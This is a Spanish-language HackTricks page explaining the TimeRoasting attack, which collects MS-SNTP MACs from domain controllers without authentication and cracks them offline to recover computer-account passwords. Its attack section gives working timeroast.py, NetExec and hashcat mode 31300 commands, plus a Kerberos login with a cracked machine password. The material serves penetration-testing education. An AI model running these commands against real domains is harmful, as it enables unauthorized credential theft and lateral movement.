# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting abusa de la extensión de autenticación heredada de MS-SNTP. En MS-SNTP, un cliente puede enviar una solicitud de 68 bytes que incluye cualquier RID de cuenta de equipo; el controlador de dominio utiliza el hash NTLM (MD4) de la cuenta de equipo como clave para calcular un MAC sobre la respuesta y lo devuelve.<sup>[[1]](#references)</sup> Los atacantes pueden recopilar estos MAC de MS-SNTP sin autenticación y crackearlos offline (modo 31300 de Hashcat) para recuperar las contraseñas de las cuentas de equipo.<sup>[[2]](#references)</sup>

Consulta las secciones 3.1.5.1 "Authentication Request Behavior" y 4 "Protocol Examples" de la especificación oficial de MS-SNTP para obtener más detalles.<sup>[[1]](#references)</sup>
![TimeRoasting: Consulta las secciones 3.1.5.1 "Authentication Request Behavior" y 4 "Protocol Examples" de la especificación oficial de MS-SNTP para obtener más detalles](../../images/Pasted%20image%2020250709114508.png)
Cuando el elemento ADM ExtendedAuthenticatorSupported es false, el cliente envía una solicitud de 68 bytes e incluye el RID en los 31 bits menos significativos del subcampo Key Identifier del authenticator.<sup>[[1]](#references)</sup>

> Si el elemento ADM ExtendedAuthenticatorSupported es false, el cliente DEBE construir un mensaje Client NTP Request. La longitud del mensaje Client NTP Request es de 68 bytes. El cliente establece el campo Authenticator del mensaje Client NTP Request tal como se describe en la sección 2.2.1, escribiendo los 31 bits menos significativos del valor RID en los 31 bits menos significativos del subcampo Key Identifier del authenticator y, a continuación, escribiendo el valor Key Selector en el bit más significativo del subcampo Key Identifier.<sup>[[1]](#references)</sup>

De la sección 4 (Protocol Examples):

> Después de recibir la solicitud, el servidor verifica que el tamaño del mensaje recibido sea de 68 bytes. Suponiendo que el tamaño del mensaje recibido sea de 68 bytes, el servidor extrae el RID del mensaje recibido. El servidor lo utiliza para llamar al método NetrLogonComputeServerDigest (tal como se especifica en la sección 3.5.4.8.2 de [MS-NRPC]) para calcular los crypto-checksums y seleccionar el crypto-checksum según el bit más significativo del subcampo Key Identifier del mensaje recibido, tal como se especifica en la sección 3.2.5. A continuación, el servidor envía una respuesta al cliente, estableciendo el campo Key Identifier en 0 y el campo Crypto-Checksum en el crypto-checksum calculado.<sup>[[1]](#references)</sup>

El crypto-checksum se basa en MD5 (consulta 3.2.5.1.1) y se puede crackear offline, lo que permite el ataque de roasting.<sup>[[1]](#references)</sup>

## Cómo atacar

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Scripts de Timeroasting de Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Ataque práctico (sin autenticación) con NetExec + Hashcat

- NetExec puede enumerar y recopilar MACs de MS-SNTP para los RIDs de los equipos sin autenticación, e imprimir hashes `$sntp-ms$` listos para crackear:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline with Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- El texto plano recuperado corresponde a la contraseña de una cuenta de equipo. Pruébala directamente como la cuenta de máquina mediante Kerberos (-k) cuando NTLM esté deshabilitado:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Consejos operativos
- Asegura una sincronización precisa de la hora antes de Kerberos: `sudo ntpdate <dc_fqdn>`
- Si es necesario, genera krb5.conf para el realm de AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Asocia los RIDs con los principals más adelante mediante LDAP/BloodHound una vez que tengas cualquier foothold autenticado.

## Referencias

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – documentación oficial](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
